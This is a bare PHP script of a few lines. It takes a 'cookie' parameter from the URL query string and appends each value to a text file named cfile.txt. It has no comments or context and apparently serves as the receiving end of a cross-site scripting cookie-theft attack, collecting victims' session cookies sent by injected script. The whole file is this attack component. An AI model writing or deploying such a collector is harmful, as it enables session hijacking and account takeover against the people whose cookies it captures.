<?php

$cookie = $_GET["cookie"];
$my_file = 'cfile.txt';
$handle = fopen($my_file, 'a');
fwrite($handle, $cookie ."\n");
fclose($handle);
?>